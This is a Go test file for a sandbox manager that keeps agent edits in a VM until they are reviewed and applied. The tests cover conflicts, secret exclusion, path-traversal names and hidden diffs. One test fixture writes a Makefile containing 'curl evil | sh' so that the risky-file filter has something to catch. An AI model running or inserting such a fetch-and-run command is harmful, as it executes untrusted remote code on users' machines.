//go:build windows

package manager

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"log/slog"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/Higangssh/hyperbutler/internal/broker/proto"
	"github.com/Higangssh/hyperbutler/internal/sandbox/ctl"
	"github.com/Higangssh/hyperbutler/internal/sandbox/wire"
	"github.com/Higangssh/hyperbutler/internal/sandbox/workspace"
	"github.com/Higangssh/hyperbutler/internal/transport"
)

// fakeVM is sbxd without a VM: the real workspace code on a folder standing in for the
// session's disk.
type fakeVM struct {
	t    *testing.T
	dir  string
	gone chan struct{}
	once sync.Once

	mu   sync.Mutex
	base workspace.Baseline
	head string
	wg   sync.WaitGroup
}

func (v *fakeVM) Dialer(port uint32, _ time.Duration) transport.Dialer {
	return transport.DialerFunc(func(context.Context) (net.Conn, error) {
		a, b := net.Pipe()
		v.wg.Add(1)
		go func() {
			defer v.wg.Done()
			defer func() { _ = b.Close() }()
			v.serve(port, b)
		}()
		return a, nil
	})
}

func (v *fakeVM) serve(port uint32, c net.Conn) {
	root, err := os.OpenRoot(v.dir)
	if err != nil {
		return
	}
	defer func() { _ = root.Close() }()
	switch port {
	case wire.CopyPort:
		b, err := workspace.Extract(root, c)
		if err != nil {
			return
		}
		v.mu.Lock()
		v.base = b
		v.mu.Unlock()
		_, _ = c.Write([]byte{1})
	case wire.Port:
		v.mu.Lock()
		b := v.base
		v.mu.Unlock()
		_ = workspace.Serve(c, root, b)
	case ctl.Port:
		t, _, _ := ctl.ReadFrame(c)
		if t == ctl.TypeShutdown {
			_ = ctl.WriteFrame(c, ctl.TypeExit, ctl.Exit(0))
			v.once.Do(func() { close(v.gone) })
			return
		}
		if t == ctl.TypeHead && v.head != "" {
			_ = ctl.WriteFrame(c, ctl.TypeOutput, []byte(v.head))
			_ = ctl.WriteFrame(c, ctl.TypeExit, ctl.Exit(0))
			return
		}
		_ = ctl.WriteFrame(c, ctl.TypeExit, ctl.Exit(ctl.ExitNoCommits))
	}
}

func (v *fakeVM) Gone() <-chan struct{} { return v.gone }
func (v *fakeVM) Terminate() error      { v.once.Do(func() { close(v.gone) }); return nil }
func (v *fakeVM) Close() error          { v.wg.Wait(); return nil }

type fakeHost struct {
	t           *testing.T
	mu          sync.Mutex
	vms         map[uint8]*fakeVM
	disks       map[uint8]bool
	boots       int
	removeFails int
}

func (h *fakeHost) Boot(_ context.Context, r BootRequest) (VM, error) {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.boots++
	// A new VM each boot, on the disk the slot had.
	v := &fakeVM{t: h.t, gone: make(chan struct{})}
	if old := h.vms[r.Slot]; old != nil {
		old.mu.Lock()
		v.dir, v.base = old.dir, old.base
		old.mu.Unlock()
	} else {
		v.dir = h.t.TempDir()
	}
	h.vms[r.Slot] = v
	return v, nil
}

func (h *fakeHost) CreateDisk(slot uint8, _ uint64) (uint64, error) {
	h.mu.Lock()
	defer h.mu.Unlock()
	if h.disks[slot] {
		return 0, errors.New("the disk exists")
	}
	if h.removeFails > 0 {
		return 0, errors.New("unused")
	}
	h.disks[slot] = true
	return 4096, nil
}

func (h *fakeHost) RemoveDisk(slot uint8) error {
	h.mu.Lock()
	defer h.mu.Unlock()
	delete(h.disks, slot)
	delete(h.vms, slot)
	return nil
}

type rig struct {
	t       *testing.T
	m       *Manager
	h       *fakeHost
	project string
	state   string
}

func newRig(t *testing.T) *rig {
	t.Helper()
	r := &rig{t: t, h: &fakeHost{t: t, vms: map[uint8]*fakeVM{}, disks: map[uint8]bool{}}, project: t.TempDir(), state: t.TempDir()}
	r.write("a.txt", "one\ntwo\n")
	r.write("b.txt", "keep\n")
	r.reload()
	t.Cleanup(func() { r.m.Close() })
	return r
}

func (r *rig) reload() {
	r.t.Helper()
	m, err := New(r.h, r.state, slog.New(slog.DiscardHandler))
	if err != nil {
		r.t.Fatal(err)
	}
	r.m = m
}

func (r *rig) write(name, s string) {
	r.t.Helper()
	p := filepath.Join(r.project, name)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		r.t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(s), 0o644); err != nil {
		r.t.Fatal(err)
	}
}

func (r *rig) read(name string) string {
	r.t.Helper()
	b, err := os.ReadFile(filepath.Join(r.project, name))
	if err != nil {
		r.t.Fatal(err)
	}
	return string(b)
}

func (r *rig) do(req Request) (Reply, error) {
	return r.m.Handle(context.Background(), &req, func(string) {})
}

func (r *rig) must(req Request) Reply {
	r.t.Helper()
	rep, err := r.do(req)
	if err != nil {
		r.t.Fatalf("%s: %v", req.Op, err)
	}
	return rep
}

func (r *rig) run(name string) string {
	r.t.Helper()
	rep := r.must(Request{Op: OpRun, Name: name, Kept: name != "", Dir: r.project, Mode: "open"})
	return rep.Session.Name
}

// guest writes in the session's folder, as the agent would.
func (r *rig) guest(name, file, s string) {
	r.t.Helper()
	m := r.m
	sess, err := m.find(name)
	if err != nil {
		r.t.Fatal(err)
	}
	r.h.mu.Lock()
	v := r.h.vms[sess.rec.Slot]
	r.h.mu.Unlock()
	p := filepath.Join(v.dir, file)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		r.t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(s), 0o644); err != nil {
		r.t.Fatal(err)
	}
}

func item(rep Reply, path string) *DiffItem {
	for i := range rep.Items {
		if rep.Items[i].Path == path {
			return &rep.Items[i]
		}
	}
	return nil
}

// TestReviewThenApply: the project changes only at apply (REQ-SBX-002).
func TestReviewThenApply(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	r.guest(n, "a.txt", "one\nTWO\n")
	r.guest(n, "new/c.txt", "new\n")
	if r.read("a.txt") != "one\ntwo\n" {
		t.Fatal("the project changed before any apply")
	}
	rep := r.must(Request{Op: OpDiff, Name: n})
	if len(rep.Items) != 2 {
		t.Fatalf("%+v", rep.Items)
	}
	a := item(rep, "a.txt")
	if a == nil || a.Kind != "modified" || a.Added != 1 || a.Removed != 1 || !strings.Contains(a.Text, "+TWO") {
		t.Fatalf("%+v", a)
	}
	if r.read("a.txt") != "one\ntwo\n" {
		t.Fatal("a review changed the project")
	}
	out := r.must(Request{Op: OpApply, Name: n, All: true})
	for _, o := range out.Outcomes {
		if o.Error != "" {
			t.Fatalf("%+v", o)
		}
	}
	if r.read("a.txt") != "one\nTWO\n" || r.read("new/c.txt") != "new\n" || r.read("b.txt") != "keep\n" {
		t.Fatal("the wrong files after apply")
	}
	if rep := r.must(Request{Op: OpDiff, Name: n}); len(rep.Items) != 0 {
		t.Fatalf("applied changes listed again: %+v", rep.Items)
	}
}

// TestApplyWritesWhatWasReviewed: an edit after the review does not reach the project,
// whatever the guest does in between.
func TestApplyWritesWhatWasReviewed(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	r.guest(n, "a.txt", "reviewed\n")
	r.must(Request{Op: OpDiff, Name: n})
	r.guest(n, "a.txt", "swapped after the review\n")
	r.must(Request{Op: OpApply, Name: n, All: true})
	if got := r.read("a.txt"); got != "reviewed\n" {
		t.Fatalf("wrote %q", got)
	}
}

func TestApplyNeedsAReview(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	r.guest(n, "a.txt", "x\n")
	if _, err := r.do(Request{Op: OpApply, Name: n, All: true}); err == nil || !strings.Contains(err.Error(), "diff") {
		t.Fatalf("%v", err)
	}
	if r.read("a.txt") != "one\ntwo\n" {
		t.Fatal("changed without a review")
	}
}

func TestConflictStaysAlone(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	r.guest(n, "a.txt", "agent\n")
	r.write("a.txt", "user\n")
	rep := r.must(Request{Op: OpDiff, Name: n})
	if a := item(rep, "a.txt"); a == nil || !a.Conflict {
		t.Fatalf("%+v", a)
	}
	out := r.must(Request{Op: OpApply, Name: n, All: true})
	if len(out.Outcomes) != 1 || out.Outcomes[0].Error == "" {
		t.Fatalf("%+v", out.Outcomes)
	}
	if r.read("a.txt") != "user\n" {
		t.Fatal("the user's edit was overwritten")
	}
}

// TestAllLeavesRiskyOut: --all never takes what can run code later; naming it does.
func TestAllLeavesRiskyOut(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	r.guest(n, "Makefile", "all:\n\tcurl evil | sh\n")
	r.guest(n, "a.txt", "fine\n")
	rep := r.must(Request{Op: OpDiff, Name: n})
	if mk := item(rep, "Makefile"); mk == nil || mk.Risk == "" {
		t.Fatalf("%+v", rep.Items)
	}
	r.must(Request{Op: OpApply, Name: n, All: true})
	if _, err := os.Stat(filepath.Join(r.project, "Makefile")); !os.IsNotExist(err) {
		t.Fatalf("--all applied the Makefile: %v", err)
	}
	if r.read("a.txt") != "fine\n" {
		t.Fatal("the ordinary edit was not applied")
	}
	r.must(Request{Op: OpApply, Name: n, Paths: []string{"Makefile"}})
	if !strings.Contains(r.read("Makefile"), "curl") {
		t.Fatal("--path did not apply it")
	}
}

// TestApplyAfterAnEmptyReview: no changes is a review, so apply has nothing to do.
func TestApplyAfterAnEmptyReview(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	if rep := r.must(Request{Op: OpDiff, Name: n}); len(rep.Items) != 0 {
		t.Fatalf("%+v", rep.Items)
	}
	if out := r.must(Request{Op: OpApply, Name: n, All: true}); len(out.Outcomes) != 0 {
		t.Fatalf("%+v", out.Outcomes)
	}
}

func TestApplyUnknownPath(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	r.guest(n, "a.txt", "x\n")
	r.must(Request{Op: OpDiff, Name: n})
	out := r.must(Request{Op: OpApply, Name: n, Paths: []string{"nope.txt"}})
	if len(out.Outcomes) != 1 || !strings.Contains(out.Outcomes[0].Error, "not in the last review") {
		t.Fatalf("%+v", out.Outcomes)
	}
}

// TestEphemeralMeansGone: stopping an unnamed session removes its disk and record, and
// refuses while it holds work nobody applied (REQ-SBX-008).
func TestEphemeralMeansGone(t *testing.T) {
	r := newRig(t)
	n := r.run("")
	if !strings.HasPrefix(n, "sbx-") {
		t.Fatalf("name %q", n)
	}
	r.guest(n, "a.txt", "work\n")
	if _, err := r.do(Request{Op: OpStop, Name: n}); err == nil || !strings.Contains(err.Error(), "nobody applied") {
		t.Fatalf("%v", err)
	}
	r.must(Request{Op: OpStop, Name: n, Discard: true})
	if len(r.h.disks) != 0 {
		t.Fatalf("disks left: %v", r.h.disks)
	}
	if _, err := os.Stat(filepath.Join(r.state, n+".json")); !os.IsNotExist(err) {
		t.Fatalf("record left: %v", err)
	}
	if _, err := r.do(Request{Op: OpDiff, Name: n}); !errors.Is(err, ErrNoSession) {
		t.Fatalf("%v", err)
	}
}

func TestEphemeralWithoutChangesEndsAtOnce(t *testing.T) {
	r := newRig(t)
	n := r.run("")
	r.must(Request{Op: OpStop, Name: n})
	if len(r.h.disks) != 0 {
		t.Fatalf("disks left: %v", r.h.disks)
	}
}

func TestKeptSurvivesStopAndManager(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	r.must(Request{Op: OpStop, Name: n})
	if !r.h.disks[1] {
		t.Fatal("stopping a kept session removed its disk")
	}
	if _, err := r.do(Request{Op: OpDiff, Name: n}); err == nil || !strings.Contains(err.Error(), "stopped") {
		t.Fatalf("%v", err)
	}
	r.m.Close()
	r.reload()
	ls := r.must(Request{Op: OpList})
	if len(ls.Sessions) != 1 || ls.Sessions[0].Name != "work" || ls.Sessions[0].Running {
		t.Fatalf("%+v", ls.Sessions)
	}
	r.must(Request{Op: OpStart, Name: n})
	r.guest(n, "a.txt", "later\n")
	// The base of the conflict check came through the record.
	rep := r.must(Request{Op: OpDiff, Name: n})
	if a := item(rep, "a.txt"); a == nil || a.Conflict {
		t.Fatalf("%+v", a)
	}
	if _, err := r.do(Request{Op: OpRemove, Name: n}); err == nil {
		t.Fatal("rm took a session with changes")
	}
	r.must(Request{Op: OpRemove, Name: n, Discard: true})
	if len(r.h.disks) != 0 {
		t.Fatalf("disks left: %v", r.h.disks)
	}
}

func TestStoppedRemoveNeedsDiscard(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	r.must(Request{Op: OpStop, Name: n})
	if _, err := r.do(Request{Op: OpRemove, Name: n}); err == nil || !strings.Contains(err.Error(), "--discard") {
		t.Fatalf("%v", err)
	}
	r.must(Request{Op: OpRemove, Name: n, Discard: true})
}

func TestSlotsAndNames(t *testing.T) {
	r := newRig(t)
	for _, n := range []string{"s1", "s2", "s3", "s4"} {
		r.run(n)
	}
	if _, err := r.do(Request{Op: OpRun, Name: "s5", Kept: true, Dir: r.project, Mode: "open"}); err == nil || !strings.Contains(err.Error(), "already have") {
		t.Fatalf("%v", err)
	}
	if len(r.must(Request{Op: OpList}).Sessions) != 4 {
		t.Fatal("a refused run left a session")
	}
	if _, err := r.do(Request{Op: OpRun, Name: "s1", Kept: true, Dir: r.project, Mode: "open"}); err == nil || !strings.Contains(err.Error(), "exists") {
		t.Fatalf("%v", err)
	}
	if _, err := r.do(Request{Op: OpRun, Name: "../evil", Dir: r.project, Mode: "open"}); err == nil {
		t.Fatal("took a name with a path in it")
	}
	if _, err := r.do(Request{Op: OpRun, Name: "x", Dir: "relative", Mode: "open"}); err == nil {
		t.Fatal("took a relative project")
	}
}

// TestAllNeedsAFullReview: --all takes only what a diff showed whole (REQ-SBX-002).
func TestAllNeedsAFullReview(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	r.guest(n, "a.txt", "changed\n")
	r.must(Request{Op: OpDiff, Name: n, StatOnly: true})
	out := r.must(Request{Op: OpApply, Name: n, All: true})
	if len(out.Outcomes) != 1 || !strings.Contains(out.Outcomes[0].Error, "did not show") {
		t.Fatalf("%+v", out.Outcomes)
	}
	if r.read("a.txt") != "one\ntwo\n" {
		t.Fatal("--all applied what --stat did not show")
	}
	r.must(Request{Op: OpApply, Name: n, Paths: []string{"a.txt"}})
	if r.read("a.txt") != "changed\n" {
		t.Fatal("--path did not apply it")
	}
}

// TestDiffPastTheTextLimit: the guest cannot push a change out of sight by putting a lot of
// text before it.
func TestDiffPastTheTextLimit(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	big := strings.Repeat(strings.Repeat("x", 100)+"\n", 15000)
	for i := range 20 {
		r.guest(n, "big/"+string(rune('a'+i))+".txt", big)
	}
	r.guest(n, "z.txt", "last\n")
	rep := r.must(Request{Op: OpDiff, Name: n})
	z := item(rep, "z.txt")
	if z == nil || z.Text != "" || !z.Unshown {
		t.Fatalf("%+v", z)
	}
	r.must(Request{Op: OpApply, Name: n, All: true})
	if _, err := os.Stat(filepath.Join(r.project, "z.txt")); !os.IsNotExist(err) {
		t.Fatalf("--all applied an unshown change: %v", err)
	}
}

func TestAttachAfterRestart(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	s, _ := r.m.find(n)
	s.terms.Store(3)
	r.must(Request{Op: OpStop, Name: n})
	r.must(Request{Op: OpStart, Name: n})
	if s.terms.Load() != 0 {
		t.Fatalf("terminals %d after a restart", s.terms.Load())
	}
}

// TestLeftoverDisk: a disk no record owns is what a failed run left, and does not stop the
// next one; with a record that could not be read it may be someone's work.
func TestLeftoverDisk(t *testing.T) {
	r := newRig(t)
	r.h.disks[1] = true
	if n := r.run("work"); n != "work" {
		t.Fatal(n)
	}
	r.must(Request{Op: OpRemove, Name: "work", Discard: true})
	r.m.Close()
	if err := os.WriteFile(filepath.Join(r.state, "bad.json"), []byte("{"), 0o600); err != nil {
		t.Fatal(err)
	}
	r.reload()
	r.h.disks[1] = true
	if _, err := r.do(Request{Op: OpRun, Name: "w2", Kept: true, Dir: r.project, Mode: "open"}); err == nil {
		t.Fatal("removed a disk a broken record may own")
	}
	if !r.h.disks[1] {
		t.Fatal("the disk is gone")
	}
}

func TestDuplicateSlotIgnored(t *testing.T) {
	r := newRig(t)
	r.run("good")
	r.m.Close()
	if err := os.WriteFile(filepath.Join(r.state, "zzz.json"), []byte(`{"name":"zzz","slot":1,"dir":"C:\\p"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	r.reload()
	if ls := r.must(Request{Op: OpList}); len(ls.Sessions) != 1 {
		t.Fatalf("%+v", ls.Sessions)
	}
}

// TestUnfetchedCommitsCount: removing a session must not lose its commits unasked.
func TestUnfetchedCommitsCount(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	s, _ := r.m.find(n)
	s.rec.Git = true
	r.h.vms[s.rec.Slot].head = strings.Repeat("a", 40)
	if _, err := r.do(Request{Op: OpRemove, Name: n}); err == nil || !strings.Contains(err.Error(), "nobody fetched") {
		t.Fatalf("%v", err)
	}
	s.rec.Fetched = strings.Repeat("a", 40)
	r.must(Request{Op: OpRemove, Name: n})
}

func TestIdleWaitsForClients(t *testing.T) {
	r := newRig(t)
	r.m.mu.Lock()
	r.m.active = 1
	r.m.mu.Unlock()
	if !r.m.IdleSince().IsZero() {
		t.Fatal("idle while a client is served")
	}
	r.m.mu.Lock()
	r.m.active = 0
	r.m.mu.Unlock()
	if r.m.IdleSince().IsZero() {
		t.Fatal("busy with nothing running")
	}
}

func TestMaxSlotIsTheBrokers(t *testing.T) {
	if MaxSlot != proto.MaxSlot {
		t.Fatalf("manager %d, broker %d", MaxSlot, proto.MaxSlot)
	}
}

func TestSecretsStayOut(t *testing.T) {
	r := newRig(t)
	r.write(".env", "TOKEN=x\n")
	rep := r.must(Request{Op: OpRun, Name: "work", Kept: true, Dir: r.project, Mode: "open"})
	found := false
	for _, s := range rep.Skipped {
		found = found || s.Path == ".env"
	}
	if !found {
		t.Fatalf("%+v", rep.Skipped)
	}
	sess, _ := r.m.find("work")
	if _, err := os.Stat(filepath.Join(r.h.vms[sess.rec.Slot].dir, ".env")); !os.IsNotExist(err) {
		t.Fatalf(".env reached the session: %v", err)
	}
}

func TestCommitsNoneAndNoRepo(t *testing.T) {
	r := newRig(t)
	n := r.run("work")
	if _, err := r.do(Request{Op: OpCommits, Name: n}); err == nil || !strings.Contains(err.Error(), "git repository") {
		t.Fatalf("%v", err)
	}
}

// TestServeProtocol goes through the pipe's framing: progress lines, then one reply.
func TestServeProtocol(t *testing.T) {
	r := newRig(t)
	a, b := net.Pipe()
	done := make(chan struct{})
	go func() { r.m.Serve(context.Background(), b); close(done) }()
	j, _ := json.Marshal(Request{Op: OpRun, Name: "p", Kept: true, Dir: r.project, Mode: "open"})
	go func() { _, _ = a.Write(append(j, '\n')) }()
	sc := bufio.NewScanner(a)
	sawProgress := false
	var last Reply
	for sc.Scan() {
		last = Reply{}
		if err := json.Unmarshal(sc.Bytes(), &last); err != nil {
			t.Fatal(err)
		}
		if last.Progress == "" {
			break
		}
		sawProgress = true
	}
	if !sawProgress || last.Session == nil || last.Session.Name != "p" {
		t.Fatalf("%+v", last)
	}
	_ = a.Close()
	<-done
}

func TestServeBadRequest(t *testing.T) {
	r := newRig(t)
	a, b := net.Pipe()
	go r.m.Serve(context.Background(), b)
	go func() { _, _ = a.Write([]byte("not json\n")) }()
	line, err := bufio.NewReader(a).ReadString('\n')
	if err != nil || !strings.Contains(line, "bad request") {
		t.Fatalf("%q %v", line, err)
	}
	_ = a.Close()
}

func TestRecordChecks(t *testing.T) {
	good := `{"name":"a","slot":1,"dir":"C:\\p","sent":{"x":"` + strings.Repeat("ab", 32) + `","l":"link:y"}}`
	if _, err := ParseRecord([]byte(good)); err != nil {
		t.Fatal(err)
	}
	for _, s := range []string{
		`{"name":"../a","slot":1,"dir":"C:\\p"}`,
		`{"name":"a","slot":0,"dir":"C:\\p"}`,
		`{"name":"a","slot":5,"dir":"C:\\p"}`,
		`{"name":"a","slot":1,"dir":"p"}`,
		`{"name":"a","slot":1,"dir":"C:\\p","sent":{"x":"zz"}}`,
		`not json`,
	} {
		if _, err := ParseRecord([]byte(s)); err == nil {
			t.Errorf("took %s", s)
		}
	}
}

func TestBrokenRecordLeavesTheRest(t *testing.T) {
	r := newRig(t)
	r.run("good")
	r.m.Close()
	if err := os.WriteFile(filepath.Join(r.state, "bad.json"), []byte("{"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(r.state, "other.json"), []byte(`{"name":"good","slot":2,"dir":"C:\\p"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	r.reload()
	if ls := r.must(Request{Op: OpList}); len(ls.Sessions) != 1 || ls.Sessions[0].Name != "good" {
		t.Fatalf("%+v", ls.Sessions)
	}
}

func FuzzParseRecord(f *testing.F) {
	f.Add([]byte(`{"name":"a","slot":1,"dir":"C:\\p","sent":{"x":"link:y"}}`))
	f.Add([]byte(`{}`))
	f.Fuzz(func(t *testing.T, b []byte) {
		r, err := ParseRecord(b)
		if err != nil {
			return
		}
		if CheckName(r.Name) != nil || r.Slot < 1 || r.Slot > MaxSlot {
			t.Fatalf("%+v", r)
		}
		_ = sentFromRecord(r.Sent)
	})
}
